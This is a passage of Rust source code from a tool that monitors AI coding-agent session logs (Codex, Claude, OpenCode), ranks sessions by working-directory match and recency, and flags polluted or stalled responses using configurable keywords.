        launch_started_at: DateTime<Utc>,
        session_id: Option<String>,
        polluted_response_keywords: Vec<String>,
        completion_pause_keywords: Vec<String>,
        polluted_response_threshold: f64,
        polluted_context_window: usize,
        polluted_check_max_chars: usize,
    ) -> Self {
        Self::new_with_continuation_trigger_rules(
            codex_home,
            workdir,
            launch_started_at,
            session_id,
            polluted_response_keywords,
            completion_pause_keywords,
            Vec::new(),
            polluted_response_threshold,
            polluted_context_window,
            polluted_check_max_chars,
        )
    }

    #[allow(clippy::too_many_arguments)]
    pub fn new_with_continuation_trigger_rules(
        codex_home: PathBuf,
        workdir: PathBuf,
        launch_started_at: DateTime<Utc>,
        session_id: Option<String>,
        polluted_response_keywords: Vec<String>,
        completion_pause_keywords: Vec<String>,
        continuation_trigger_rules: Vec<ContinuationTriggerRule>,
        polluted_response_threshold: f64,
        polluted_context_window: usize,
        polluted_check_max_chars: usize,
    ) -> Self {
        Self {
            codex_home,
            workdir,
            launch_started_at,
            session_id,
            session_path: None,
            last_task_started_at: None,
            last_task_finished_at: None,
            last_session_append_at: None,
            waiting_for_turn_after: None,
            assistant_message_count: 0,
            assistant_message_count_at_wait_start: None,
            pollution_detected: false,
            completion_pause_detected: false,
            continuation_trigger_prompt: None,
            endpoint_failure_detected: false,
            token_usage_total: TokenUsage::default(),
            active_turn_ids: HashSet::new(),
            position: 0,
            polluted_response_keywords,
            completion_pause_keywords,
            continuation_trigger_rules,
            polluted_response_threshold,
            polluted_context_window,
            polluted_check_max_chars,
        }
    }

    pub fn poll(&mut self) {
        if self.session_path.as_ref().is_none_or(|path| !path.exists()) {
            self.attach_session_file();
        }
        let Some(path) = self.session_path.clone() else {
            return;
        };
        let Ok(file) = File::open(&path) else {
            return;
        };
        if self.position > path.metadata().map(|meta| meta.len()).unwrap_or(0) {
            self.position = 0;
            self.active_turn_ids.clear();
        }
        let mut reader = BufReader::new(file);
        if reader.seek(SeekFrom::Start(self.position)).is_err() {
            return;
        }
        let before = self.position;
        let mut last_good_position = self.position;
        let mut next_position = self.position;
        let mut line = String::new();
        loop {
            line.clear();
            let Ok(bytes) = reader.read_line(&mut line) else {
                break;
            };
            if bytes == 0 {
                break;
            }
            next_position = next_position.saturating_add(bytes as u64);
            if let Ok(item) = serde_json::from_str::<Value>(&line) {
                self.observe_item(&item);
                last_good_position = next_position;
            } else if line.ends_with('\n') || line.ends_with('\r') {
                last_good_position = next_position;
            } else {
                break;
            }
        }
        self.position = last_good_position;
        if next_position > before {
            self.last_session_append_at = Some(Instant::now());
        }
    }

    pub fn has_inflight_turn(&self) -> bool {
        !self.active_turn_ids.is_empty()
    }

    pub fn begin_waiting_for_new_turn(&mut self) {
        let now = Instant::now();
        self.waiting_for_turn_after = Some(now);
        self.assistant_message_count_at_wait_start = Some(self.assistant_message_count);
        self.last_task_started_at = None;
        self.last_task_finished_at = None;
        self.active_turn_ids.clear();
        if self.session_path.is_some() {
            self.last_session_append_at = Some(now);
        }
    }

    pub fn has_assistant_message_since_wait_start(&self) -> bool {
        self.assistant_message_count_at_wait_start
            .map(|count| self.assistant_message_count > count)
            .unwrap_or(true)
    }

    pub fn mark_turn_completed_by_idle(&mut self) {
        self.active_turn_ids.clear();
        self.last_task_finished_at = Some(Instant::now());
        self.waiting_for_turn_after = None;
    }

    pub fn session_tail_stalled(&self, stall_after: Duration) -> bool {
        self.session_path.is_some()
            && self
                .last_session_append_at
                .is_some_and(|last_append| last_append.elapsed() >= stall_after)
    }

    fn attach_session_file(&mut self) {
        let index = CodexSessionIndex::new(self.codex_home.clone());
        let file = if let Some(session_id) = &self.session_id {
            index.find_latest_session_file_for_workdir(&self.workdir, Some(session_id))
        } else {
            index.find_new_session_file_for_workdir(&self.workdir, self.launch_started_at)
        };
        let Some(file) = file else {
            return;
        };
        self.position = 0;
        if let Some(meta) = read_session_meta(&file) {
            if let Some(id) = meta.get("id").and_then(Value::as_str) {
                self.session_id = Some(id.to_string());
            }
        }
        self.session_path = Some(file);
    }

    fn observe_item(&mut self, item: &Value) {
        let Some(timestamp) = parse_timestamp(item.get("timestamp")) else {
            return;
        };
        if timestamp < self.launch_started_at {
            return;
        }
        let Some(payload) = item.get("payload").and_then(Value::as_object) else {
            return;
        };
        if payload.get("type").and_then(Value::as_str) == Some("token_count") {
            if let Some(total) = payload
                .get("info")
                .and_then(|info| info.get("total_token_usage"))
            {
                self.token_usage_total = extract_token_usage(&json!({"usage": total}));
            }
            return;
        }
        if item.get("type").and_then(Value::as_str) == Some("response_item") {
            if payload.get("type").and_then(Value::as_str) == Some("message")
                && payload.get("role").and_then(Value::as_str) == Some("assistant")
            {
                self.assistant_message_count += 1;
                let text = extract_message_text(payload.get("content").unwrap_or(&Value::Null));
                let polluted = pollution_detection_configured(&self.polluted_response_keywords)
                    && is_keyword_polluted_text(
                        &text,
                        &self.polluted_response_keywords,
                        self.polluted_response_threshold,
                        self.polluted_context_window,
                        self.polluted_check_max_chars,
                    );
                if polluted {
                    self.pollution_detected = true;
                } else if let Some(prompt) =
                    continuation_trigger_prompt_for_text(&text, &self.continuation_trigger_rules)
                {
                    self.continuation_trigger_prompt.get_or_insert(prompt);
                } else if contains_keyword(&text, &self.completion_pause_keywords) {
                    self.completion_pause_detected = true;
                }
            }
            return;
        }
        let event_type = payload
            .get("type")
            .and_then(Value::as_str)
            .unwrap_or_default();
        if !matches!(
            event_type,
            "task_started" | "task_complete" | "turn_aborted"
        ) {
            return;
        }
        let turn_id = payload
            .get("turn_id")
            .and_then(Value::as_str)
            .unwrap_or("__unknown__")
            .to_string();
        if event_type == "task_started" {
            self.active_turn_ids.insert(turn_id);
            self.last_task_started_at = Some(Instant::now());
            return;
        }
        if self.waiting_for_turn_after.is_some() && self.last_task_started_at.is_none() {
            return;
        }
        if turn_id == "__unknown__" {
            self.active_turn_ids.clear();
        } else {
            self.active_turn_ids.remove(&turn_id);
        }
        self.last_task_finished_at = Some(Instant::now());
        self.waiting_for_turn_after = None;
    }
}

pub fn normalize_workdir(workdir: &Path) -> String {
    workdir
        .canonicalize()
        .unwrap_or_else(|_| workdir.to_path_buf())
        .to_string_lossy()
        .to_ascii_lowercase()
}

fn jsonl_files(root: &Path) -> Vec<PathBuf> {
    let mut out = Vec::new();
    if !root.exists() {
        return out;
    }
    visit_jsonl(root, &mut out);
    out
}

fn json_files(root: &Path) -> Vec<PathBuf> {
    let mut out = Vec::new();
    if root.exists() {
        visit_json(root, &mut out);
    }
    out
}

fn visit_json(path: &Path, out: &mut Vec<PathBuf>) {
    let Ok(entries) = fs::read_dir(path) else {
        return;
    };
    for entry in entries.flatten() {
        let path = entry.path();
        if path.is_dir() {
            visit_json(&path, out);
        } else if path.extension().and_then(|value| value.to_str()) == Some("json") {
            out.push(path);
        }
    }
}

fn visit_jsonl(path: &Path, out: &mut Vec<PathBuf>) {
    let Ok(entries) = fs::read_dir(path) else {
        return;
    };
    for entry in entries.flatten() {
        let path = entry.path();
        if path.is_dir() {
            visit_jsonl(&path, out);
        } else if path.extension().and_then(|value| value.to_str()) == Some("jsonl") {
            out.push(path);
        }
    }
}

pub fn discover_codex_session_homes(root: &Path) -> Vec<PathBuf> {
    let mut homes = Vec::new();
    let mut queue = VecDeque::new();
    let mut seen = HashSet::new();
    if root.is_dir() {
        queue.push_back(root.to_path_buf());
    }
    while let Some(path) = queue.pop_front() {
        let key = normalize_workdir(&path);
        if !seen.insert(key) {
            continue;
        }
        if path.join("sessions").is_dir() {
            homes.push(path);
            continue;
        }
        let Ok(entries) = fs::read_dir(&path) else {
            continue;
        };
        for entry in entries.flatten() {
            let child = entry.path();
            if child.is_dir() {
                queue.push_back(child);
            }
        }
    }
    homes.sort();
    homes
}

fn read_session_meta(path: &Path) -> Option<Value> {
    let file = open_session_file_for_read(path)?;
    for line in BufReader::new(file).lines().map_while(Result::ok) {
        let item: Value = serde_json::from_str(&line).ok()?;
        if item.get("type").and_then(Value::as_str) != Some("session_meta") {
            continue;
        }
        let mut meta = item.get("payload")?.clone();
        if let Some(timestamp) = item.get("timestamp") {
            meta["timestamp"] = timestamp.clone();
        }
        return Some(meta);
    }
    None
}

pub fn codex_session_file_matches(path: &Path, workdir: &Path, session_id: &str) -> bool {
    let Some(meta) = read_session_meta(path) else {
        return false;
    };
    if meta.get("id").and_then(Value::as_str) != Some(session_id) {
        return false;
    }
    meta.get("cwd")
        .and_then(Value::as_str)
        .map(|cwd| normalize_workdir(Path::new(cwd)))
        .as_deref()
        == Some(normalize_workdir(workdir).as_str())
}

#[derive(Debug, Clone)]
struct RankingContext {
    normalized_workdir: String,
    workspace_name: String,
    config_name: String,
    agent_name: String,
    workdir_fragments: Vec<String>,
}

impl RankingContext {
    fn new(workdir: &Path, config_name: &str, agent_name: &str) -> Self {
        let normalized_workdir = normalize_workdir(workdir);
        let workspace_name = workdir
            .file_name()
            .and_then(|name| name.to_str())
            .unwrap_or_default()
            .trim()
            .to_ascii_lowercase();
        Self {
            workdir_fragments: path_fragments(&normalized_workdir),
            normalized_workdir,
            workspace_name,
            config_name: config_name.to_ascii_lowercase(),
            agent_name: agent_name.to_ascii_lowercase(),
        }
    }
}

fn codex_candidate_from_path(
    path: PathBuf,
    context: &RankingContext,
    owners: &HashMap<String, String>,
) -> Option<SessionCandidate> {
    let meta = read_session_meta(&path)?;
    let session_id = meta.get("id").and_then(Value::as_str)?.to_string();
    let workdir = meta.get("cwd").and_then(Value::as_str).map(PathBuf::from);
    let modified_at = path
        .metadata()
        .and_then(|meta| meta.modified())
        .ok()
        .map(DateTime::<Utc>::from);
    let summary = recent_session_summary(&path);
    if !session_matches_context(workdir.as_deref(), &summary, context) {
        return None;
    }
    let (mut score, mut reason) = rank_candidate(
        workdir.as_deref(),
        context,
        modified_at,
        &summary,
        owners.get(&session_id),
    );
    if latest_codex_session_goal_record(&path).is_some() {
        score += 900;
        if reason.trim().is_empty() {
            reason = "含历史 Goal".to_string();
        } else if !reason.contains("含历史 Goal") {
            reason.push('、');
            reason.push_str("含历史 Goal");
        }
    }
    Some(SessionCandidate {
        session_id: session_id.clone(),
        path,
        workdir,
        modified_at,
        score,
        reason,
        summary,
        occupied_by: owners.get(&session_id).cloned(),
    })
}

fn claude_candidate_from_path(
    path: PathBuf,
    context: &RankingContext,
    owners: &HashMap<String, String>,
) -> Option<SessionCandidate> {
    let session_id = path.file_stem()?.to_string_lossy().to_string();
    let workdir = claude_session_workdir(&path);
    let modified_at = path
        .metadata()
        .and_then(|meta| meta.modified())
        .ok()
        .map(DateTime::<Utc>::from);
    let summary = recent_session_summary(&path);
    if !session_matches_context(workdir.as_deref(), &summary, context) {
        return None;
    }
    let (score, reason) = rank_candidate(
        workdir.as_deref(),
        context,
        modified_at,
        &summary,
        owners.get(&session_id),
    );
    Some(SessionCandidate {
        session_id: session_id.clone(),
        path,
        workdir,
        modified_at,
        score,
        reason,
        summary,
        occupied_by: owners.get(&session_id).cloned(),
    })
}

fn opencode_candidate_from_value(
    item: &Value,
    legacy_path: Option<PathBuf>,
    context: &RankingContext,
    owners: &HashMap<String, String>,
) -> Option<SessionCandidate> {
    if !opencode_session_is_root(item) {
        return None;
    }
    let session_id = extract_session_id(item)?;
    let workdir = extract_workdir(item);
    let modified_at = opencode_session_timestamp(item);
    let summary = opencode_session_summary(item);
    if !session_matches_context(workdir.as_deref(), &summary, context) {
        return None;
    }
    let (score, reason) = rank_candidate(
        workdir.as_deref(),
        context,
        modified_at,
        &summary,
        owners.get(&session_id),
    );
    Some(SessionCandidate {
        path: legacy_path
            .unwrap_or_else(|| PathBuf::from(format!("opencode-session://{session_id}"))),
        workdir,
        modified_at,
        score,
        reason,
        summary,
        occupied_by: owners.get(&session_id).cloned(),
        session_id,
    })
}

fn session_workdir_matches_context(
    session_workdir: Option<&Path>,
    context: &RankingContext,
) -> bool {
    let Some(workdir) = session_workdir.map(normalize_workdir) else {
        return false;
    };
    workdir == context.normalized_workdir || path_is_related(&workdir, &context.normalized_workdir)
}

fn session_matches_context(
    session_workdir: Option<&Path>,
    summary: &str,
    context: &RankingContext,
) -> bool {
    if session_workdir_matches_context(session_workdir, context) {
        return true;
    }
    let haystack = summary.to_ascii_lowercase();
    workspace_name_matches_context(&haystack, context)
}

fn rank_candidate(
    session_workdir: Option<&Path>,
    context: &RankingContext,
    modified_at: Option<DateTime<Utc>>,
    summary: &str,
    occupied_by: Option<&String>,
) -> (i64, String) {
    let mut score = 0;
    let mut reasons = Vec::new();
    if let Some(session_workdir) = session_workdir {
        let session_norm = normalize_workdir(session_workdir);
        if session_norm == context.normalized_workdir {
            score += 2000;
            reasons.push("工作目录完全一致");
        } else if path_is_related(&session_norm, &context.normalized_workdir) {
            score += 1200;
            reasons.push("工作目录是父子路径");
        } else {
            let matched = shared_path_fragment_count(&session_norm, &context.workdir_fragments);
            if matched >= 2 {
                score += 350 + (matched as i64 * 80).min(400);
                reasons.push("命中多个路径片段");
            } else if matched == 1 {
                score += 160;
                reasons.push("命中路径片段");
            }
        }
    }
    if let Some(age_seconds) = modified_at.map(|at| (Utc::now() - at).num_seconds().max(0)) {
        if age_seconds <= 300 {
            score += 2600;
            reasons.push("最近 5 分钟更新");
        } else if age_seconds <= 3600 {
            score += 1900;
            reasons.push("最近 1 小时更新");
        } else if age_seconds <= 86_400 {
            score += 1200;
            reasons.push("最近 1 天更新");
        } else if age_seconds <= 604_800 {
            score += 500;
            reasons.push("最近 7 天更新");
        }
    }
    let haystack = summary.to_ascii_lowercase();
    if workspace_name_matches_context(&haystack, context) {
        score += 1800;
        reasons.push("命中工作区名");
    }
    for part in context.workdir_fragments.iter().take(10) {
        if haystack.contains(part) {
            score += 200;
            reasons.push("命中路径片段");
            break;
        }
    }
    if !context.config_name.trim().is_empty() && haystack.contains(&context.config_name) {
        score += 150;
        reasons.push("命中配置名");
    }
    if !context.agent_name.trim().is_empty() && haystack.contains(&context.agent_name) {
        score += 150;
        reasons.push("命中 agent 名");
    }
    if let Some(owner) = occupied_by {
        score -= 1000;
        if owner.is_empty() {
            reasons.push("已被其他 agent 绑定");
        } else {
            reasons.push("已被其他 agent 绑定到其他配置");
        }
    }
    if reasons.is_empty() {
        reasons.push("仅作为低相关候选");
    }
    (score, reasons.join("、"))
}

fn workspace_name_matches_context(haystack: &str, context: &RankingContext) -> bool {
    context.workspace_name.chars().count() >= 3 && haystack.contains(&context.workspace_name)
}

fn sort_session_candidates(candidates: &mut [SessionCandidate]) {
    candidates.sort_by(|a, b| {
        b.modified_at
            .cmp(&a.modified_at)
            .then_with(|| b.score.cmp(&a.score))
    });
}

fn dedupe_session_candidates(candidates: &mut Vec<SessionCandidate>) {
    let mut seen = HashSet::new();
    candidates.retain(|candidate| seen.insert(candidate.session_id.clone()));
}

fn path_is_related(a: &str, b: &str) -> bool {
    let a = a.replace('\\', "/");
    let b = b.replace('\\', "/");
    path_has_child_prefix(&a, &b) || path_has_child_prefix(&b, &a)
}

fn path_has_child_prefix(path: &str, prefix: &str) -> bool {
    path.strip_prefix(prefix)
        .is_some_and(|rest| rest.starts_with('/'))
}

fn path_fragments(path: &str) -> Vec<String> {
    path.replace('\\', "/")
        .split('/')
        .map(str::trim)
        .filter(|part| part.len() >= 3)
        .map(str::to_ascii_lowercase)
        .collect()
}

fn shared_path_fragment_count(path: &str, fragments: &[String]) -> usize {
    let session_fragments = path_fragments(path);
    fragments
        .iter()
        .filter(|fragment| session_fragments.iter().any(|item| item == *fragment))
        .count()
}

fn claude_session_workdir(path: &Path) -> Option<PathBuf> {
    let file = open_session_file_for_read(path)?;
    for line in BufReader::new(file).lines().map_while(Result::ok).take(80) {
        let Ok(item) = serde_json::from_str::<Value>(&line) else {
            continue;
        };
        for key in ["cwd", "projectCwd", "workspace", "workdir"] {
            if let Some(value) = item.get(key).and_then(Value::as_str) {
                return Some(PathBuf::from(value));
            }
        }
    }
    None
}

pub fn recent_session_detail_summary(path: &Path) -> String {
    let lines = recent_session_jsonl_tail_lines(path, DETAIL_SUMMARY_TAIL_READ_BYTES, 80);
    let mut sections = Vec::new();
    for line in lines {
        let Ok(item) = serde_json::from_str::<Value>(&line) else {
            continue;
        };
        let text = extract_session_summary_text(&item);
        if text.trim().is_empty() {
            continue;
        }
        let item_type = item
            .get("type")
            .and_then(Value::as_str)
            .or_else(|| {
                item.get("payload")
                    .and_then(|payload| payload.get("type"))
                    .and_then(Value::as_str)
            })
            .unwrap_or("记录");
        sections.push(format!(
            "### {}\n\n{}",
            markdown_escape_heading(item_type),
            text.trim()
        ));
        if sections.len() >= 24 {
            break;
        }
    }
    sections.join("\n\n")
}

pub fn latest_codex_session_goal(path: &Path) -> Option<String> {
    latest_codex_session_goal_record(path).map(|record| record.text)
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CodexSessionGoalRecord {
    pub text: String,
    pub signature: String,
}

pub fn latest_codex_session_goal_record(path: &Path) -> Option<CodexSessionGoalRecord> {
    let file = open_session_file_for_read(path)?;
    let mut latest = None;
    for (line_index, line) in BufReader::new(file)
        .lines()
        .map_while(Result::ok)
        .enumerate()
    {
        let Ok(item) = serde_json::from_str::<Value>(&line) else {
            continue;
        };
        let goal = codex_thread_goal_event_text(&item)
            .or_else(|| codex_user_message_text(&item).and_then(|text| goal_from_user_text(&text)));
        if let Some(goal) = goal {
            latest = Some(CodexSessionGoalRecord {
                text: goal,
                signature: codex_goal_signature(line_index, &line),
            });
        }
    }
    latest
}

fn codex_goal_signature(line_index: usize, line: &str) -> String {
    let mut hasher = DefaultHasher::new();
    line.hash(&mut hasher);
    format!("line:{}:hash:{:016x}", line_index + 1, hasher.finish())
}

fn codex_thread_goal_event_text(item: &Value) -> Option<String> {
    if item.get("type").and_then(Value::as_str) != Some("event_msg") {
        return None;
    }
    let payload = item.get("payload")?;
    if payload.get("type").and_then(Value::as_str) != Some("thread_goal_updated") {
        return None;
    }
    payload
        .get("goal")
        .and_then(|goal| goal.get("objective"))
        .and_then(Value::as_str)
        .map(str::trim)
        .filter(|text| !text.is_empty())
        .map(str::to_string)
}

fn recent_session_summary(path: &Path) -> String {
    let lines = recent_session_jsonl_tail_lines(path, SUMMARY_TAIL_READ_BYTES, 30);
    let mut summary = String::new();
    for line in lines {
        if let Ok(item) = serde_json::from_str::<Value>(&line) {
            let text = extract_session_summary_text(&item);
            if !text.trim().is_empty() {
                if !summary.is_empty() {
                    summary.push(' ');
                }
                summary.push_str(text.trim());
            }
        }
        if summary.len() > 500 {
            summary = utf8_prefix(&summary, 500);
            break;
        }
    }
    summary
}

fn recent_session_jsonl_tail_lines(
    path: &Path,
    max_read_bytes: u64,
    max_lines: usize,
) -> Vec<String> {
    let Some(mut file) = open_session_file_for_read(path) else {
        return Vec::new();
    };
    let len = file.metadata().map(|meta| meta.len()).unwrap_or(0);
    let start = len.saturating_sub(max_read_bytes);
    if file.seek(SeekFrom::Start(start)).is_err() {
        return Vec::new();
    }
    let mut bytes = Vec::new();
    if std::io::Read::read_to_end(&mut file, &mut bytes).is_err() {
        return Vec::new();
    }
    let text = String::from_utf8_lossy(&bytes);
    let mut lines = VecDeque::with_capacity(max_lines);
    for (index, line) in text.lines().enumerate() {
        if start > 0 && index == 0 {
            continue;
        }
        if line.trim().is_empty() {
            continue;
        }
        if lines.len() == max_lines {
            lines.pop_front();
        }
        lines.push_back(line.to_string());
    }
    lines.into_iter().collect()
}

fn open_session_file_for_read(path: &Path) -> Option<File> {
    #[cfg(windows)]
    {
        const FILE_SHARE_READ: u32 = 0x0000_0001;
        const FILE_SHARE_WRITE: u32 = 0x0000_0002;
        const FILE_SHARE_DELETE: u32 = 0x0000_0004;
        fs::OpenOptions::new()
            .read(true)
            .share_mode(FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE)
            .open(path)
            .ok()
    }
    #[cfg(not(windows))]
    {
        File::open(path).ok()
    }
}

fn markdown_escape_heading(text: &str) -> String {
    text.chars()
        .filter(|ch| !matches!(ch, '#' | '\r' | '\n'))
        .collect::<String>()
        .trim()
        .to_string()
}

fn extract_session_summary_text(item: &Value) -> String {
    let mut parts = Vec::new();
    collect_summary_text(item, &mut parts, 0);
    strip_ansi_and_controls(&parts.join(" "))
}

fn strip_ansi_and_controls(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    let mut chars = text.chars().peekable();
    while let Some(ch) = chars.next() {
        if ch == '\u{1b}' {
            if chars.peek().copied() == Some('[') {
                chars.next();
                for next in chars.by_ref() {
                    if ('@'..='~').contains(&next) {
                        break;
                    }
                }
            }
            continue;
        }
        if ch.is_control() && !matches!(ch, '\n' | '\r' | '\t') {
            continue;
        }
        out.push(ch);
    }
    compact_whitespace(&out)
}

fn compact_whitespace(text: &str) -> String {
    let mut out = String::new();
    for part in text.split_whitespace() {
        if !out.is_empty() {
            out.push(' ');
        }
        out.push_str(part);
    }
    out
}

fn codex_user_message_text(item: &Value) -> Option<String> {
    if item.get("type").and_then(Value::as_str) == Some("response_item") {
        let payload = item.get("payload")?;
        if payload.get("type").and_then(Value::as_str) == Some("message")
            && payload.get("role").and_then(Value::as_str) == Some("user")
        {
            return Some(extract_message_text(
                payload.get("content").unwrap_or(&Value::Null),
            ));
        }
    }
    if item.get("role").and_then(Value::as_str) == Some("user")
        || item.get("type").and_then(Value::as_str) == Some("user")
        || item
            .get("message")
            .and_then(|message| message.get("role"))
            .and_then(Value::as_str)
            == Some("user")
    {
        return Some(extract_any_message_text(item));
    }
    None
}

fn goal_from_user_text(text: &str) -> Option<String> {
    for line in text.lines() {
        let line = line.trim();
        let Some(rest) = line.strip_prefix("/goal") else {
            continue;
        };
        if rest.is_empty() || rest.starts_with(char::is_whitespace) {
            let goal = rest.trim();
            if !goal.is_empty() {
                return Some(goal.to_string());
            }
        }
    }
    None
}

fn collect_summary_text(value: &Value, parts: &mut Vec<String>, depth: usize) {
    if depth > 10 || parts.len() >= 24 {
        return;
    }
    match value {
        Value::String(text) => {
            let clean = text.trim();
            if is_useful_summary_text(clean) {
                parts.push(clean.to_string());
            }
        }
        Value::Array(items) => {
            for item in items {
                collect_summary_text(item, parts, depth + 1);
                if parts.len() >= 24 {
                    break;
                }
            }
        }
        Value::Object(map) => {
            for key in [
                "text",
                "content",
                "message",
                "output",
                "input",
                "summary",
                "transcript",
                "parts",
                "delta",
                "payload",
                "item",
            ] {
                if let Some(child) = map.get(key) {
                    collect_summary_text(child, parts, depth + 1);
                }
            }
        }
        _ => {}
    }
}

fn is_useful_summary_text(text: &str) -> bool {
    if text.len() < 2 {
        return false;
    }
    let lower = text.to_ascii_lowercase();
    !matches!(
        lower.as_str(),
        "assistant"
            | "user"
            | "system"
            | "developer"
            | "message"
            | "response_item"
            | "event_msg"
            | "session_meta"
            | "task_started"
            | "task_complete"
    )
}

fn utf8_prefix(text: &str, max_bytes: usize) -> String {
    if text.len() <= max_bytes {
        return text.to_string();
    }
    let mut end = max_bytes.min(text.len());
    while end > 0 && !text.is_char_boundary(end) {
        end -= 1;
    }
    text[..end].to_string()
}

fn parse_timestamp(value: Option<&Value>) -> Option<DateTime<Utc>> {
    let text = value?.as_str()?;
    DateTime::parse_from_rfc3339(text)
        .ok()
        .map(|value| value.with_timezone(&Utc))
}

fn parse_flexible_timestamp(value: Option<&Value>) -> Option<DateTime<Utc>> {
    let value = value?;
    if let Some(number) = value.as_i64() {
        return if number.abs() >= 100_000_000_000 {
            DateTime::<Utc>::from_timestamp_millis(number)
        } else {
            DateTime::<Utc>::from_timestamp(number, 0)
        };
    }
    if let Some(number) = value.as_u64().and_then(|value| i64::try_from(value).ok()) {
        return if number >= 100_000_000_000 {
            DateTime::<Utc>::from_timestamp_millis(number)
        } else {
            DateTime::<Utc>::from_timestamp(number, 0)
        };
    }
    let text = value.as_str()?.trim();
    if let Ok(number) = text.parse::<i64>() {
        return parse_flexible_timestamp(Some(&Value::Number(number.into())));
    }
    DateTime::parse_from_rfc3339(text)
        .ok()
        .map(|value| value.with_timezone(&Utc))
}

fn opencode_session_timestamp(item: &Value) -> Option<DateTime<Utc>> {
    parse_flexible_timestamp(
        item.get("updated")
            .or_else(|| item.get("updatedAt"))
            .or_else(|| item.get("created"))
            .or_else(|| item.get("createdAt"))
            .or_else(|| item.get("time").and_then(|time| time.get("updated")))
            .or_else(|| item.get("time").and_then(|time| time.get("created"))),
    )
}

fn opencode_session_created_timestamp(item: &Value) -> Option<DateTime<Utc>> {
    parse_flexible_timestamp(
        item.get("created")
            .or_else(|| item.get("createdAt"))
            .or_else(|| item.get("time").and_then(|time| time.get("created"))),
    )
}

fn opencode_session_summary(item: &Value) -> String {
    ["title", "name", "slug"]
        .into_iter()
        .filter_map(|key| item.get(key).and_then(Value::as_str))
        .map(str::trim)
        .filter(|text| !text.is_empty())
        .collect::<Vec<_>>()
        .join(" · ")
}

fn new_opencode_session_id_since(
    value: &Value,
    workdir: &Path,
    launch_started_at: DateTime<Utc>,
    session_ids_before_launch: Option<&HashSet<String>>,
) -> Option<String> {
    let target = normalize_workdir(workdir);
    let earliest = launch_started_at - chrono::Duration::seconds(5);
    coerce_json_list(value)
        .into_iter()
        .filter_map(|item| {
            if !opencode_session_is_root(item) {
                return None;
            }
            let session_workdir = extract_workdir(item)?;
            if normalize_workdir(&session_workdir) != target {
                return None;
            }
            let session_id = extract_session_id(item)?;
            if session_ids_before_launch.is_some_and(|ids| ids.contains(&session_id)) {
                return None;
            }
            // An old session may receive a fresh `updated` timestamp while the TUI
            // starts. Creation time identifies the session created by this launch.
            let created_at = opencode_session_created_timestamp(item)
                .or_else(|| opencode_session_timestamp(item))?;
            if created_at < earliest {
                return None;
            }
            let distance = (created_at - launch_started_at).num_milliseconds().abs();
            Some((distance, created_at, session_id))
        })
        .min_by_key(|(distance, created_at, _)| (*distance, *created_at))
        .map(|(_, _, session_id)| session_id)
}

fn opencode_root_session_ids_for_workdir(value: &Value, workdir: &Path) -> HashSet<String> {
    let target = normalize_workdir(workdir);
    coerce_json_list(value)
        .into_iter()
        .filter(|item| opencode_session_is_root(item))
        .filter_map(|item| {
            let session_workdir = extract_workdir(item)?;
            (normalize_workdir(&session_workdir) == target).then(|| extract_session_id(item))?
        })
        .collect()
}

fn opencode_session_is_root(item: &Value) -> bool {
    item.get("parentID")
        .or_else(|| item.get("parentId"))
        .and_then(Value::as_str)
        .is_none_or(|id| id.trim().is_empty())
}

fn default_opencode_data_dir() -> PathBuf {
    if let Some(path) = std::env::var_os("XDG_DATA_HOME").filter(|path| !path.is_empty()) {
        return PathBuf::from(path).join("opencode");
    }
    std::env::var_os("USERPROFILE")
        .or_else(|| std::env::var_os("HOME"))
        .map(PathBuf::from)
        .unwrap_or_else(|| PathBuf::from("."))
        .join(".local")
        .join("share")
        .join("opencode")
}

fn extract_message_text(content: &Value) -> String {
    if let Some(text) = content.as_str() {
        return text.to_string();
    }
    content
        .as_array()
        .into_iter()
        .flatten()
        .filter_map(|item| item.get("text").and_then(Value::as_str))
        .collect()
}

fn contains_keyword(text: &str, keywords: &[String]) -> bool {
    let haystack = text.to_ascii_lowercase();
    keywords
        .iter()
        .filter(|keyword| !keyword.is_empty())
        .any(|keyword| haystack.contains(&keyword.to_ascii_lowercase()))
}

fn continuation_trigger_prompt_for_text(
    text: &str,
    rules: &[ContinuationTriggerRule],
) -> Option<String> {
    if text.trim().is_empty() {
        return None;
    }
    rules.iter().find_map(|rule| {
        let patterns = rule
            .keywords
            .iter()
            .filter(|pattern| !pattern.trim().is_empty())
            .collect::<Vec<_>>();
        if patterns.is_empty() || rule.prompt.trim().is_empty() {
            return None;
        }
        let matches = patterns
            .iter()
            .filter(|pattern| Regex::new(pattern).is_ok_and(|regex| regex.is_match(text)))
            .count();
        let ratio = matches as f64 / patterns.len() as f64;
        let triggered = if rule.threshold <= 0.0 {
            matches > 0
        } else {
            ratio >= rule.threshold
        };
        triggered.then(|| rule.prompt.clone())
    })
}

fn claude_session_matches_workdir(path: &Path, normalized_workdir: &str) -> bool {
    let Ok(file) = File::open(path) else {
        return false;
    };
    for line in BufReader::new(file).lines().map_while(Result::ok).take(80) {
        let Ok(item) = serde_json::from_str::<Value>(&line) else {
            continue;
        };
        for key in ["cwd", "projectCwd", "workspace", "workdir"] {
            if item
                .get(key)
                .and_then(Value::as_str)
                .map(|value| normalize_workdir(Path::new(value)))
                == Some(normalized_workdir.to_string())
            {
                return true;
            }
        }
    }
    path.to_string_lossy().to_ascii_lowercase().contains(
        &normalized_workdir
            .replace('\\', "/")
            .trim_matches('/')
            .replace('/', "-"),
    )
}

fn is_assistant_message(item: &Value) -> bool {
    item.get("type").and_then(Value::as_str) == Some("assistant")
        || item.get("role").and_then(Value::as_str) == Some("assistant")
        || item
            .get("message")
            .and_then(|message| message.get("role"))
            .and_then(Value::as_str)
            == Some("assistant")
}

fn claude_assistant_message_is_final(item: &Value) -> bool {
    item.get("message")
        .and_then(|message| message.get("stop_reason"))
        .or_else(|| item.get("stop_reason"))
        .and_then(Value::as_str)
        .map(str::trim)
        .is_some_and(|reason| {
            !reason.is_empty()
                && !matches!(
                    reason.to_ascii_lowercase().as_str(),
                    "tool_use" | "tool-use" | "tool_calls" | "tool-calls"
                )
        })
}

fn extract_claude_message_text(item: &Value) -> String {
    let content = item
        .get("message")
        .and_then(|message| message.get("content"))
        .or_else(|| item.get("content"))
        .unwrap_or(&Value::Null);
    extract_message_text(content)
}

fn coerce_json_list(value: &Value) -> Vec<&Value> {
    if let Some(items) = value.as_array() {
        return items.iter().collect();
    }
    if let Some(map) = value.as_object() {
        for key in ["sessions", "data", "items", "rows"] {
            if let Some(items) = map.get(key).and_then(Value::as_array) {
                return items.iter().collect();
            }
        }
        return vec![value];
    }
    Vec::new()
}

fn extract_session_id(item: &Value) -> Option<String> {
